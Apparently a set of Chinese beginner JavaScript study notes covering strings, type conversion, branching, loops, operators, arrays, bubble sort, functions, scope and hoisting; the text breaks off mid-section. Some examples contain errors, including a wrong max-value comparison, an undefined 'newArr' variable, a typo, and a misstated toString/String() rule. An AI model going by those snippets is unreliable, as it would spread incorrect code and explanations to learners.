字符串可以使用单引号,也可以使用双引号

>[danger] ##### 获取长度-length

![](https://box.kancloud.cn/5a335d8f5692d25b48e5714bce626bc3_280x53.png)

>[danger] ##### 拼接字符串 - +
```
1.字符串的拼接: 使用+可以把多个字符串放在一起形成一个字符串
2.只要有一个是字符串,其他的是数字,那么结果也是拼接,不是相加
3.如果有一个是字符串,另一个不是字符串,使用- 号,此时会发生计算
```

>[danger] ##### 拼接案例

**同是字符串**
```
var str1="您好";
var str2="我好";
onsole.log(str1+str2);

结果： 您好我好
```

**一个是一个不是**
```
var str1="10";
var str2=20;
console.log(str1+str2);

结果： 1020
```

**做减法**
```
var str1 = "10";
var str2 = 5;
console.log(str1-str2);

结果：5
```
[TOC=1,5]
>[success] # 其他类型转数字类型

>总结:想要转整数用parseInt(),想要转小数用parseFloat()
   想要转数字:Number();要比上面的两种方式严格

>[danger] ##### 转整数 - parseInt()
```
 console.log(parseInt("10"));      //10
 console.log(parseInt("10afrswfdsf")); //10
 console.log(parseInt("g10"));   //NaN
 console.log(parseInt("1fds0"));   //1
 console.log(parseInt("10.98"));    //10
 console.log(parseInt("10.98fdsfd"));  //10
```

>[danger] ##### 转成小数 - parseFloat()
```
 console.log(parseFloat("10"));//10
 console.log(parseFloat("10afrswfdsf"));//10
 console.log(parseFloat("g10"));//NaN
 console.log(parseFloat("1fds0"));//1
 console.log(parseFloat("10.98"));//10.98
 console.log(parseFloat("10.98fdsfd"));//10.98
```

>[danger] ##### 转成数字 - Number()
```
console.log(Number("10"));//10
console.log(Number("10afrswfdsf"));//NaN
console.log(Number("g10"));//NaN
console.log(Number("1fds0"));//NaN
console.log(Number("10.98"));//10.98
console.log(Number("10.98fdsfd"));//NaN
```




<br>

* * * * *
>[success] # 其他类型从转换成字符串

>[danger] ##### .toString()

```
1.toString()可以将所有的的数据都转换为字符串，但是要排除null 和 undefined，也就是flase 和 true，包含在内，也可以做进制转换例如：

2.String()可以将null和undefined转换为字符串，但是没法转进制字符串，也不能对flase和true 转换
```
```
var num=10;
console.log(num.toString());//字符串类型
```

>[danger] ##### String()

```
var num=10;
console.log(String(num));
```


<br>

* * * * *

>[success] # boolean 类型

>[danger] ##### 案例
```
 console.log(Boolean(1));//true
 console.log(Boolean(0));//false
 console.log(Boolean(11));//true
 console.log(Boolean(-10));//true
 console.log(Boolean("哈哈"));//true
 console.log(Boolean(""));//false
 console.log(Boolean(" "));//true
 console.log(Boolean(null));//false
 console.log(Boolean(undefined));//false

```
[TOC=1,5]
>[success] # 变量

```
1.js中声明变量都用var---->存储数据,数据应该有对应的数据类型
2.js中的字符串类型的值都用双引号或者单引号
3.变量声明(有var 有变量名字,没有值)
	3.1例子：
		var number;//变量的声明,此时是没有赋值的
        var x,y,z,k,j;//都是声明,没有赋值，一次生明多个

4.变量初始化(有var 有变量名字,有值)
	4.1例子：
		 var number = 10；
         
5.声明多个变量然后一个一个的赋值
	5.1例子：
		var num1,num2,num3;//声明
        num1=10;
        num2=20;
        num3=30;
        
6.声明多个变量并且赋值
	6.1例子：
		var num1=10,num2=20,num3=30;
```

>[danger] ##### 代码的规范

```
1.js中声明变量都用var
2.js中的每一行代码结束都应该有分号;(写代码有分号的习惯)
3.js中的大小写是区分的: var N=10; n
4.js中的字符串可以使用单引号,也可以使用双引号,
```

>[danger] ##### 命名规范

```
1.变量的名字要有意义
2.变量名有一定的规范:一般以字母,$符号,下划线开头,中间或者后面可以有$符号,字母,数字
3.变量名一般都是小写的
4.变量名如果是多个单词,第一个单词的首字母是小写的,后面的所有的单词的首字母都是大写的,这种命名方式称为:驼峰命名法
5.不能使用关键字(系统自带的一些单词,不能使用)
```


>[success] # 有两个变量，交换彼此


>[danger] ##### 方法一
```
    var v1 = 1;
    var v2 = 2;
    var temp = v1;
    v1 = v2
    v2 = temp
```

* * * * *
>[danger] ##### 方法二
```
var num1 = 10;
var num2 = 20;

//把num1的变量中的值和num2变量中的值,取出来相加,重新赋值给num1这个变量
num1 = num1 + num2;//30

//num1变量的值和num2变量的值取出来,相减的结果重新赋值给num2
num2 = num1 - num2;//10

//num1变量的值和num2变量的值取出来,相减的结果重新赋值给num1
num1 = num1 - num2;//20

console.log(num1, num2);
```


* * * * *
>[danger] ##### 方法三

```
    var num1 = 10;
    var num2 = 20;
    num1 = num1 ^ num2;
    num2 = num1 ^ num2;
    num1 = num1 ^ num2;
    console.log(num1, num2);
```

>[success] # 流程控制的三种方法

```
1.顺序结构:从上到下,从左到右执行的顺序,就叫做顺序结构
2.分支结构:if语句,if-else语句,if-else if-else if...语句,switch-case语句,三元表达式语句
3.循环结构:while循环,do-while循环,for循环,for-in循环
```
[if-分支语句](if-分支语句.md)
[if-else分支语句](if-else.md)
[三元分支语句](三元分支语句.md)
[if-else if 分支语句](if-elseif分支语句.md)
[switch-case 分支语句](switch-case分支语句.md)
[分支判断的总结](分支判断的总结.md)

>[success] # if 用来判断的，条件是布尔类型

>[danger] ##### 语法

>执行过程，先判断表达式的结果，如果是true执行代码块，如果是flase，大括号的不执行
```
if(表达式){
	代码块
}
```

>[danger] ##### 案例一，如果8大于6，打印8

```
if(8>6){
	console.log(8)
}
```

* * * * *
>[danger] ##### 案例二，如果一百大于十结果

```
var num = 10;
var num1 = 100;
if(num>num1){
	console.log('我不会执行')
}
console.log('我执行了')
```

* * * * *
>[danger] #####  案例三，如果十八岁可以考驾照
```
var age = 19;
if(age>18){
	console.log('可以考驾照了')
}
```


* * * * *
>[danger] ##### 案例四，问你帅不帅
```
var str = “帅”
if(str == "帅"){
	console.log("打印帅")
}

```
[TOC=1,5]
>[success] # if-else 满足做什么，不满足做什么

>[danger] ##### 语法 

>如果表达式为true 执行第一个代码块，否则第二个
```
if(表达式){
	代码块1
}else{
	代码块2
}
```

>[danger] ##### 案例一，如果十八了可以考驾照，否则不可以

```
 var age = 18 ;
    if(age>=18){
        console.log('可以考驾照')
    }else{
        console.log('不可以')
    }
```

>[danger] ##### 案例二, prompt 弹窗输入

![](https://box.kancloud.cn/75f8f426ca1ad1269515373a2aade9d1_650x160.png)


* * * * *
>[danger] ##### 案例三，请输入年龄判断是否成年
```
 var age = parseInt(prompt('请输入年龄'))
    if(age >= 18){
        console.log('成年了')
    }else{
        console.log('未成年')
    }
```

>[danger] 案例三，找出两个数最大值

```
 var num1 = 10;
  var num2 = 20;
  if(num1>num2){
      console.log(num1)
  }else{
      console.log(num2)
  }
```

>[danger] ##### 案例四，判断是奇数还是偶数

```
 var num = parseInt(prompt('请输入数字'))
    if(num%2 == 0){
        console.log("偶数")
    }else{
        console.log("奇数")
    }
```
[TOC=1,5]
>[success] # 一种if-else 的简写

>[danger] ##### 语法
```
var 变量=表达式1?表达式2:表达式3;
```

如果表达式1为真，返回2，否则3

>[danger] ##### 案例一，两个数的最大值

```
  var x = 10;
    var y = 20;
   var num = x>y? x:y;
   console.log(num)
```

>[danger] ##### 案例二，成年未成年

```
var age = 10;
var result2 = age >= 18 ? "成年了" : "未成年";
console.log(result2);

```
>[success]  # if-else if 有多个条件时候

>[danger] ##### 语法
```
if(表达式1){
	代码1
 }else if(表达式2){
	 代码2
 }else if(表达式3){
  	代码3
 }else{
  	代码4
}
```

>[danger] ##### 案例一，判读A,B,C,D等级

```
 var sroce = Number(prompt('请输入成绩'))
    if(!isNaN(sroce)){
        if(sroce>=90 && sroce<=100){
            console.log("A")
        }else if(sroce>=80){
            console.log("B")
        }else if(sroce>=60){
            console.log("C")
        }else {
            console.log("D")
        }
    }
```

>[danger] ##### 判断闰年

>能被4整除且不能被100整除,或者能被四百整除的为闰年

```
var year = 2017;
    if (year%4==0 && year%100!=0||year % 400 == 0 ){
        console.log("闰年")
    } else{
        console.log("平年")
    }
```
[TOC=1,5]
>[success] # 分支语句判断单个值使用

>[danger] ##### 语法

```
switch(表达式){
     case 值1:代码1;break;
     case 值2:代码2;break;
     case 值3:代码3;break;
     case 值4:代码4;break;
      ...多个case
     default:代码5;
     
      }
```

>[danger] ##### 注意 case 用的是严格匹配，就是类型一致

打印结果是字符串
```
var score="10";
    switch(score){
        case 10:
            console.log("数字")
            break
        case "10":
            console.log("字符串")
            break
    }
```

>[danger] ##### 案例一，判断成绩打印

```
var score = "E"
    switch (score){
        case "A":
            console.log('优秀')
            break;
        case "B":
            console.log("一般")
            break;
        default:
            console.log('不及格')
    }
```

>[danger] ##### 案例二，判断月份是几天
```
   var month=parseInt(prompt("请输入月份"));
   switch (month){
     case 1:
     case 3:
     case 5:
     case 7:
     case 8:
     case 10:
     case 12:console.log("31天");break;
     case 4:
     case 6:
     case 9:
     case 11:console.log("30天");break;
     case 2:console.log("28天");break;
   }

```

>[danger] ##### 案例三，判断当前星期几

```
 var num = parseInt(prompt('请输入数字'))
    switch (num){
        case 1:console.log("星期一");break;
        case 2:console.log("星期二");break;
        case 3:console.log("星期三");break;
        case 4:console.log("星期四");break;
        case 5:console.log("星期五");break;
        case 6:console.log("星期六");break;
        case 7:console.log("星期七");break;
        default:console.log("请输入数字");break;
    }
```
>[success] # 总结

```
  分支语句:
     if语句:一个分支
     if-else语句:两个分支,最终只执行一个分支
     if-else if-else if...语句: 多个分支,也是只会执行一个
    switch-case语句:多分支语句,最终也会一个(必须要有break)
     三元表达式:和if-else语句是一样的
     什么时候使用if-else if...: 一般是对范围的判断
    什么时候使用switch-case语句:一般是对具体的值的判断
    如果有多个分支,是针对范围的判断一般选择if-else if的语句
     如果有多个分支,是针对具体的值判断,一般选择用switch-case语句
```
[while循环语句](while循环语句.md)
[do-while 循环语句](do-while循环语句.md)
[do 和 while 区别](do和while区别.md)
[for循环语句](for循环语句.md)
[经典题目画星星](经典题目画星星.md)
[经典题目斐波那契数列](经典题目斐波那契数列.md)
[break--关键字](break--关键字.md)
[continue-关键字](continue-关键字.md)

[TOC=1,5]
>[success] # while 循环语句

>先判断条件是否成立,(条件的结果是true还是false),如果是false,那么循环的代码(while的大括号中的代码都不执行),如果是true,那么先执行循环体,然后执行计数器,然后,直接去--->循环的条件,再次判断是否成立,成立则继续执行循环体,否则跳出循环,执行完循环体之后,计数器加1,然后再去循环的条件,判断,成立则循环,否则跳出循环

>[danger] ##### 语法

```
1. 要有计数器
2. 要有循环条件
3. 要有循环结束条件
```

```
计数器
var 变量=0;
while(循环的条件){
循环体;
计数器++;
     }
```

>[danger] ##### 案例一，输出十次我很帅
```
var i = 0;
  while (i<10){
      console.log("帅");
      i++;

  }
```


>[danger] ##### 案例二，计算一到一百的和


```
var sum = 0;// 储存和
    var i =1; // 计数器
    while (i<=100){
        sum+=i; 	// sum=sum+i
        i++;
    }
    console.log(sum)
```

>[danger] ##### 案例三，计算6的乘阶
```
 var num = 1;
    var mu = 1;
    while (num<=6){
        mu *= num
        num++;
    }
    console.log(mu)
```


>[danger] ##### 案例三，求一百以内的偶数和
```
 var num = 1;
    var sum = 0;
    while (num<=100){
       if(num%2==0){
           sum+=num
       }
       num++;
    }
    console.log(sum)
```

>[danger] ##### 输入用户名密码
```
var pwd = prompt("输入密码")
   var user = prompt("输入用户名")
    while(user!='admin' || pwd!="123"){
        pwd = prompt("输入密码")
        user = prompt("输入用户名")
    }
   console.log("登录成功");
```
>[success] # 先执行后循环 do-while

* 执行过程:
     * 先执行一次循环体,然后判断条件是否成立,不成立,则跳出循环,成立则执行循环体,然后再判断条件是否成立,成立则继续循环,否则跳出.....
     
>[danger] ##### 语法
```
do{
       循环体
     }while(条件);
```

>[danger] ##### 案例一，打印十次我变帅了
```
   var i = 0;
   do{
       console.log('我变帅了');
       i++;
   }while (i<10)
```

>[danger] ##### 案例二，用户回答是的

```
  do{
       var resutl = prompt("我帅么")
       
   }while (resutl != "y")
```


>[danger] ##### 一百以内三的倍数和

```
var i = 1;
    var sum = 0;
    do {
      if (i % 3 == 0) {
        sum += i;
      }
      i++;
    } while (i <= 100);
    console.log(sum);
```
>[success] # 区别
```
 while循环特点:先判断,后循环,有可能一次循环体都不执行
  
 do-while循环特点:先循环,后判断,至少执行一次循环体
```
>[success] # for 循环

>[danger] ##### 语法

* 执行过程:
     * 先执行一次表达式1,然后判断表达式2;如果不成立则直接跳出循环
     * 如果表达式2成立,执行循环体的代码,结束后,跳到表达式3执行,然后跳到表达式2,判断表达式2是否成立,不成立,则跳出循环
     * 如果表达式2成立,则执行循环体,然后再跳到表达式3,再跳到表达式2,判断是否成立,一直如此
     
```
for(表达式1;表达式2;表达式3){
      		循环体;
      }
```


>[danger] ##### 案例一，打印十次我变帅了

```
 for(i=0;i<10;i++){
     console.log("我变帅了")
 }
```

>[danger] ##### 案例二，求一百到一的和

```
    sum = 0
    for(i=1;i<=100;i++){
        sum +=i;
    }
    console.log(sum)
```

>[danger] ##### 案例三，求一百以内的偶数和
```
sum = 0
    for(i=1;i<=100;i++){
        if(i%2==0){
            sum +=i;
        }

    }
    console.log(sum)
```
>[danger] #####  在页面画5*5- document

注意几点，外循环一次内循环一遍，外层控制行数，内层控制列数
```
for(i=0;i<5;i++){
        for (j=0;j<5;j++){
            document.write("★")
        }
        document.write("</br>")
   }
```

>[danger] ##### 画一个三角形

内层用，外层不断变化的，属性，来做一个动态的变量
```
 for (i=0;i<5;i++){
       for(j=0;j<=i;j++){
           document.write("★")
       }
       document.write("<br>")
   }
```

>[danger] ##### 乘法口诀

```
for(i=1;i<=9;i++){
      for (j=1;j<=i;j++){
          document.write(j+"*"+i+"="+j*i)
      }
      document.write("<br>")
  }
```

>[danger] ##### table 乘法口诀

```
document.write("<table border='1' cellpadding='0' cellspacing='0'>");
    for(i=1;i<=9;i++){
        document.write("<tr>")
        for (j=1;j<=i;j++){
            document.write("<td>")
            document.write(j+"*"+i+"="+j*i)
            document.write("<td>")
      }
      document.write("</tr>")
  }
    document.write("</table>");
```

>[danger] ##### 本金10000元存入银行，年利率是千分之三，每过1年，将本金和利息相加作为新的本金。计算5年后，获得的本金是多少？


```
var sum=10000
    for(i=0;i<5;i++){
        sum+= sum*0.003
    }
    console.log(sum)
```

>
>[success] # 斐波那契数列

```
   有个人想知道，一年之内一对兔子能繁殖多少对？于是就筑了一道围墙把一对兔子关
在里面。已知一对兔子每个月可以生一对小兔子，而一对兔子从出生后第3个月起每
月生一对小兔子。假如一年内没有发生死亡现象，那么，一对兔子一年内（12个月
）能繁殖成多少对？（兔子的规律为数列，1，1，2，3，5，8，13，21）

```

>[danger] ##### 分析

第一个月 1
第二个月 1
第三个月  2   第一+第二
第四个月 3   第三+第四
....

sum1 = 1
sum2 = 1
sum3 =  sum1+sum2
......

sum4 = sum2  +（sum1+sum2）

* * * * *

![](https://box.kancloud.cn/9edcbdebb328c50446dea68afbfe4aa1_448x87.png)

>[danger] ##### 代码

```
  // 1,1,2,3,5,8,
    var sum1 = 1;
    var sum2 = 1;
    var sum = 0;
    for(var i=3;i<=12;i++){
        sum = sum1+sum2;
        sum1 = sum2;
        sum2 = sum
    }
    console.log(sum)
```
>[success]  # break 结束当前循环

```
break 关键字:如果在循环中使用,遇到了break,则立刻跳出当前所在的循环
```

>[danger] ##### 案例

因为是结束当前循环，所有虽然while 等于 true，但每次只执行了一次，因为遇到了break 循环就终止了
```
 for(var i=0;i<10;i++){
        while(true){
            console.log("不执行")
            break;
        }
        console.log(1)
    }
```

>[danger] ##### 案例二100-200能被七整除的第一个数

```
    for(var i=100;i<=200;i++){
        if(i%7==0){
            console.log(i);
            break;
        }
    }
```
>[success] # continue 跳出本次循环

```
continue:在循环中如果遇到continue关键字,直接开始下一次循环
```

>[danger] ##### 案例 打印0-10 除了1

```
 for(var i=0;i<=10;i++){
        if(i==1){
            continue;
        }
        console.log(i)
    }
```

>[danger] 用continue 来求1-10的奇数和
```
 sum = 0
    for(var i=1;i<=10;i++){
        if(i%2==0){
            continue;
        }
        sum+=i
    }
    console.log(sum)
```

>[danger] 求1-10 除了3的和

```
   sum = 0
    for(var i=1;i<=10;i++){
        if(i%10==3){
            continue;
        }
        sum+=i
    }
    console.log(sum)
```

**while方法：**
```
 sum = 0
    i=1;
    while(i<=10){
        if(i%10==3){
            i++;
            continue
        }
        sum+=i;
        i++;
    }
```
[TOC=1,5]
>[success] # 操作符

>一些符号-----用来计算

>[danger] ##### 算数运算符
```
算数运算符:  +  -  * / %

算数运算表达式:由算数运算符连接起来的表达式
```
**说明% 取余**
![](https://box.kancloud.cn/048e47dcc12244774f3a411c5831913a_225x49.png)


* * * * *
>[danger] ##### 一元运算符

```
这个操作符只需要一个操作数就可以运算的符号  ++  --
++ 和 --  可以分为:前+ 和后+  and   前- 和后-

相同点：
	num++ 和++ num 在没有参与运算的时候都是自身加一

不同点：
    当++在后面的时候，先参与运算在加1	
	当加加在前面的时候，先加一在参与运算
```
**相同点：**
![](https://box.kancloud.cn/1d9393f0019e5516403e93042cea39f3_350x201.png)

**不同点：**
后++ 不自加在参与运算
![](https://box.kancloud.cn/4f42a78f28b1b906f63aac85579a2e62_561x207.png)

* * * * *
>[danger] ##### 二元运算符


```
这个操作符需要两个操作数就可以运算, 1+1
```

* * * * *
>[danger] ##### 三元运算符

```

```

* * * * *
>[danger] ##### 复合运算符

```
复合运算符: +=  -=  *= /= %=
复合运算表达式:由复合运算符连接起来的表达式


var num=10;
num+=10;------>就是:num=num+10;
console.log(num);20
```
![](https://box.kancloud.cn/df6a89aeab3836f9d4f2bcb6319572e9_185x64.png)




* * * * *

>[danger] ##### 关系运算符

```
>  <  >=  <=  ==不严格的 ===严格的 !=不严格的不等 !==严格的不等

严格指的是类型一致，关系运算表达式的结果是布尔类型
```


* * * * *

>[danger] ##### 逻辑运算符
```
&&---逻辑与--并且
||---逻辑或---或者
!---逻辑非---取反--取非

逻辑运算表达式:由逻辑运算符连接起来的表达式
     * 表达式1&&表达式2
     * 如果有一个为false,整个的结果就是false
     * 表达式1||表达式2
     * 如果有一个为true,整个的结果为true
     * !表达式1
     * 表达式1的结果是true,整个结果为false
     * 表达式1的结果是false,整个结果为true
```
>[success] # python 和js 不一样的结果

> 如果有一个是字母字符串，另一个不是字符串是数字，用 - 或者* 结果是什么？ 

>答案结果是NaN，python的结果自己去试一试 
![](https://box.kancloud.cn/ef2dca036c84e50ff379cace27cfd243_204x67.png)
[TOC=1,5]
>[success] # 什么是数组

```
1.数组:一组有序的数据
2.数组的作用:可以一次性存储多个数据
```
>[info] ## 数组的知识点
```
数组元素:就是数组中存储的数据
    * 数组长度:就是数组中元素的个数
    * 数组索引(下标):从0开始,到数组的长度减1结束
    * 通过下标设置数组的元素值: 数组名[索引]=值
    * 通过下标访问数组的元素值: 数组名[索引]
```

>[danger] ##### 数组的长度属性-.length
```
arre.length
```

* * * * *


>[info] ## 创建数组的两种方式

>[danger] ##### 通过构造函数创建

`var 数组名=new Array(); `

```
1.var arry = new Array();// 创建了个对象空数组

2.var arry = new Array(5);// 定义了一个长度为五的数组
	*如果数组中没有数据,但是有长度---,数组中的每个值就是undefined
    
3.var arry = new Array(1,5,6,7);//定义了 数组数据
```

>[danger] ##### 字面量方式定义数组


`var arry = []`
```
1.var arry = [];// 空数组
2.var arry = [1,2,3,4,5]//储存数据
```


>[success] # 循环数组中的数据

```
    var arr= [10,20,30,40,50,60,70,80]
    for(var i=0;i<arr.length;i++){
        console.log(arr[i]);
    }
```
[TOC=1,5]
>[success] # 求数组简单案例

>[danger] ##### 求数组中的和

```
    var arr= [10,20,30,40,50,60,70,80];
    var sum = 0
    for(var i=0;i<arr.length;i++){
        sum+=arr[i];
    }
    console.log(sum)
```


* * * * *

>[danger] ##### 求平均值

```
    var arr= [10,20,30,40,50,60,70,80];
    var sum = 0
    for(var i=0;i<arr.length;i++){
        sum+=arr[i];
    }
    console.log(sum/arr.length)
```

>[danger] ##### 求最大值
```
    var arr= [10,20,30,40,50,60,70,80];
    // 假设最大值
    var maxvalue = arr[0]
    for(var i=1;i<arr.length;i++){
        //判断最大值
        if(arr[0]<arr[i]){
            maxvalue=arr[i]
        }
    }
    console.log(maxvalue)
```

**Number.MIN_VALUE 打印的是number所储存的最小值**
```
    var arr3=[1,3,2,5,10,100,50];
       //假设max变量中存储的是最大值
       var max=Number.MIN_VALUE;//假设变量是最大的,但是实际上存储的是最小的值
       for(var i=0;i<arr3.length;i++){
         //判断这个变量的值和数组中每个元素的值是不是最大值
         if(max<arr3[i]){
           max=arr3[i];
         }
       }
       console.log("最大值:"+max);
```

>[danger] ##### 倒叙输出数组中的值

```
    var arr= [10,20,30,40,50,60,70,80];
    for(var i=arr.length-1;i>=0;i--){
        console.log(arr[i])
    }
```

>[danger] ##### 字符串的拼接

**展示效果**
![](https://box.kancloud.cn/e4989711e2bf9b70bfd5d0dd81a16de4_319x22.png)

```
 var str = "";
    var names=["卡卡西","佐助","鸣人","大蛇丸","雏田","小苏","凤姐","黑崎一护"];

    //长度减1 只展示到倒数第二个元素，通过拼接上去
    for(var i = 0;i<names.length-1;i++){
        str+=names[i]+"|"
    }
    console.log(str+names[names.length-1])
```


* * * * *
>[danger] ##### 去掉数组中的0

```
  var arr = [10, 0, 20, 0, 30, 0, 50];
    var  Narr = []
    for(var i =0;i<arr.length;i++){
        if(arr[i] != 0){
            // 默认长度为 0 所以默认数组长度，利用长度和脚标-1的关系
            Narr[newArr.length] = arr[i]
        }
    }
```

>[danger] ##### 数组的反转

首先反转需要次数 是总长度的一半，利用两个值互换结果用，中间值做第三方，长度和脚标的关系
```
var array = [10, 20, 30, 40, 50];

for(i=0;i<array.length/2;i++){
    temp = array[i]
    // 元素长度和脚标的关系
    array[i] = array[array.length-1-i]
    array[array.length-1-i] = temp
}
```

>[danger] ##### 提示用户输入班级人数,求总成绩,平均值,最高分,最低分

```
var perCount = parseInt(prompt('请输入班级人数'));
    var perScores = []
    for(var i=0;i<perCount;i++){
        perScores[perScores.length] = prompt("请输入第"+(i+1)+"个人的分数")
    }
```
>[success] # 冒泡排序

![](https://box.kancloud.cn/8dc05b226d1cd5a6928c94eff2df8c96_902x370.png)

```
如图分析，外层循环轮数，内层循环次数，所以双层for循环
```
>[danger] ##### 代码如下

```
    var arry = [1,2,3,4,5,6]
    // 外层循环轮数
    for(var i=0;i<arry.length-1;i++){
        // 内层循环次数
        for(var j=0;j<arry.length-1-i;j++){
            if(arry[j] < arry[j+1]){
                var temp = arry[j]
                arry[j] =arry[j+1]
                arry[j+1] =temp
            }
        }
    }
    console.log(arry)
```
[TOC=1,5]
>[success] # 什么是函数

```
1.函数:把一坨重复的代码封装,在需要的时候直接调用即可
2.函数的作用:代码的重用
```

>[success] # 函数的使用
```
1.函数需要先定义,然后才能使用
2.函数名字:要遵循驼峰命名法
3.函数一旦重名,后面的会把前面的函数覆盖
4.Ctrl +鼠标左键---->转到定义
5.一个函数最好就是一个功能
```

>[danger] ##### 定义函数

```
function 函数名字(){
     函数体
     }
```


>[danger] ##### 调用函数
```
函数名();
```


>[success] # 函数参数
```
函数参数:
     在函数定义的时候,函数名字后面的小括号里的变量就是参数,目的是函数在调用的时候,用户传进来的值操作
     此时函数定义的时候后面的小括号里的变量叫参数;写了两个变量,就有两个参数,
     在函数调用的时候,按照提示的方式,给变量赋值--->就叫传值,把这个值就传到了变量(参数)中
     
      形参:函数在定义的时候小括号里的变量叫形参
      实参:函数在调用的时候小括号里传入的值叫实参,实参可以是变量也可以是值
```


>[success] # 函数的例子 

>[danger] #####  三个数字的最大值

```
    function consoleMax2() {
      var x = 10;
      var y = 20;
      var z = 30;
      var max = x > y ? (x > z ? x : z) : (y > z ? y : z);//嵌套的三元表达式
      console.log(max);
    }
```
>[success] # 全局作用域
```
1.全局变量的使用范围，任何地方都可以使用
2.全局变量,如果页面不关闭,那么就不会释放,就会占空间,消耗内存
```

>[danger] ##### 全局变量
```
1.声明的变量是使用var声明的,那么这个变量就是全局变量,全局变量可以在页面
	的任何位置使用，除了函数以外,其他的任何位置定义的变量都是全局变量
```
>[danger] ##### 全局变量的例子
```
if(true){
    var num = 1;
}
console.log(num)

打印1
```
* 注：
```
1.在java中有块级作用域的概念，也就是在这个大括号中的，定义变量，只能在
 这个大括号中访问，但js 不是，只有在定义函数内时存在的，若没有定义函数
 类似上面的例子，这个就是全局变量
```
>[danger] ##### 隐式全局变量
```
1.声明的变量没有var,就叫隐式全局变量
2.隐式全局变量是为了，解决函数变量只能在函数中诞生的
```
>[danger] ##### 隐式全局变量的例子
```
function f1(){
    num = 1
};
f1();
console.log(num)

打印结果：1
```
注：
```
1.上面 要注意的是，但函数执行了，变量创建了，才能全局使用
```

>[danger] ##### 两者全局的区别
```
1.全局变量是不能被删除的,隐式全局变量是可以被删除的
2.定义变量使用var是不会被删除的,没有var是可以删除的
```
* 例子
```
var num1=10;
num2=20;

delete num1;//把num1 不会删除
delete num2;//把num2 会彻底删除
```
[TOC]
>[success] # 函数说明
```
function f1() {
    console.log("表达式执行匿名函数")
};
console.log(f1)
其中 如果直接打印函数名，展示的是函数代码，打印如下：
f1() {
    console.log("表达式执行匿名函数")
}
```

>[success] # 命名函数
```
1.函数如果有名字,就是命名函数
```
>[danger] ##### 使用
```
function f1(){
	console.log("命名函数")
};

f1();//调用
```

>[success]# 匿名函数
```
1.函数如果没有名字,就是匿名函数
```

>[danger] ##### 通过函数表达式使用匿名函数
```
1.把一个函数给一个变量,此时形成了函数表达式
2.var 变量=匿名函数;
3.函数表达式后面,赋值结束后,要加分号
```
```
var f1 = function() {
    console.log("表达式执行匿名函数")
};
f1();
```

>[success] # 函数的自调用
```
1.函数的自调用,没有名字,调用---声明的同时,直接调用
2.一次性的 安全
3.结合函数说明理解这块
```
```
(function(){console.log("函数的自调用");})();
```

>[success] # 函数声明和函数表达式 区别

>[danger] #####  当函数名一致是
```
// 函数声明
function f1() {
  console.log("第一");
}
f1();
function f1() {
  console.log("第二");
}
f1();
------------------------------------
//函数表达式
var f2 = function () {
  console.log("第一");
};
f2();
f2 = function () {
  console.log("第二");
};
f2();
```
```
1.上面的函数展示中，在函数声明的中，重名的函数不管你在哪里调用，都执行
	最后一个函数，也就是说上面的代码只会输出第二
2.函数表达式就不会出现函数声明 重名的问题，只会依次正常执行，可以理解成
	num=1； num num=2 num; 会依次执行 
```
>[success] # 预解析
```
1.前解析代提码
2.把变量的声明提前了----提前到当前所在的作用域的最上面
3.函数的声明也会被提前---提前到当前所在的作用域的最上面
```

>[danger] ##### 解释变量声明提前
```
1.下面四种情况，第一种但未定义变量的时候会报错
2.当定义了没给参数赋值就会出现 undefined
3.当定义了赋值了 就会出现正常的输出情况
4.当 调用在输出前面的时候，就会出现预解析，根据上面 解释理解第四个代码实
 际执行的效果如下
 	var num; // 偷偷的把所有变量都提前了
	console.log(num) //undefined
	var num = 5;
```
```
console.log(num)  // 运行后报错
```
```
var num;
console.log(num)  //undefined
```

```
var num = 5;
console.log(num) //5
```
```
console.log(num) //undefined
var num = 5;
```

>[danger] ##### 解释函数声明提前
```
1.下面三种案例，第一种正常输出正常使用
2第二种.根据上面的解释 会把整个代码块提前，也就是实际跟案例一一样
3.第三种也是把整个函数提前到调用的上面，导致了最上面是function 第二层是
 f1()第三层是var num=5，又根据变量var num 会提前声明 就出现了undefined
 4.
```
```

function f1() {
    var num = 5;
    console.log(num);
}
f1()  // 打印结果 5
```

```
f1()  //打印结果5
function f1() {
    var num = 5;
    console.log(num);
}
```
```
f1() //undefined
var num=5
function f1() {
    console.log(num);
}
```
>[danger] ##### 函数与解析讲解重名解释
```
1.根据预解析讲解 实际重名 展示效果如下，注意只是把函数的代码块提前到f1()
上面 而不是最上面
function f1() {
    var num=1;
    console.log(num);
}
function f1() {
    var num=2;
    console.log(num);
}
f1()
f1()

```

```
function f1() {
    var num=1;
    console.log(num);
}
f1()  // 2

function f1() {
    var num=2;
    console.log(num);
}
f1() //2
```
>[danger] ##### 作用域链 特殊讲解
```
1. 根据作用域，首先是会先执行函数里面的var num 定义，由于预解析，导致。
 函数内部的var num 在函数内部最上面，而不会执行 最外面的var num=5
```

```
var num=5
function f1() {
    console.log(num);
    var num=6;
}
f1() //undefined
```

>[danger] ##### 升级案例
```
 function f1() {
   var a;//局部变量
   a=9;
   //隐式全局变量
   b=9;
   c=9;
   console.log(a);//9
   console.log(b);//9
   console.log(c);//9
 }
 f1();
 console.log(c);//  9
 console.log(b);// 9
 console.log(a);//报错
```
>[success] # 回调函数
```
1.函数可以作为参数使用,如果一个函数作为参数,那么我们说这个参数(函数)可以叫回调函数
2.只要是看到一个函数作为参数使用了,那就是回调函数
```

>[danger] ##### 使用
```
function f1(fn) {
  console.log("我是");
  fn();//fn此时应该是一个函数
}
function f2() {
  console.log("回调函数");
}


f1(f2);
```
[TOC]
>[success] # 函数的return
```
1.如果一个函数中有return ,那么这个函数就有返回值
2.如果一个函数中没有return,那么这个函数就没有返回值
3.如果一个函数中没有明确的返回值,那么调用的时候接收了,结果就是undefined
 (没有明确返回值:函数中没有return,函数中有return,但是return后面没有任何内容)
4.函数没有返回值,但是在调用的时候接收了,那么结果就是undefined
5.变量声明了,没有赋值,结果也是undefined
6.如果一个函数有参数,有参数的函数
7.如果一个函数没有参数,没有参数的函数
8.形参的个数和实参的个数可以不一致
9.return 下面的代码是不会执行的
```

>[danger] ##### 案例
```
    //- 求1-n之间所有数的和
    function geteverySum(n) {
      var sum = 0;
      for (var i = 1; i <= n; i++) {
        sum += i;
      }
      return sum;
    }
    console.log(geteverySum(10));
```

>[danger] ##### 把函数作为一个返回值
```
function f1() {
console.log("f1函数调用了");
return function () {
  console.log("这是一个函数");
};
}

var ff=f1();//调用
//ff就是一个函数了
ff();
```
>[success] # arguments伪数组
```
定义一个函数,如果不确定用户是否传入了参数,或者说不知道用户传了几个参数,
没办法计算,但是如果在函数中知道了参数的个数,也知道了，每个参数的值.可以
使用arguments
```
>[danger] ##### 定义
```
   function f1() {
     //获取的是函数在调用的时候,传入了几个参数
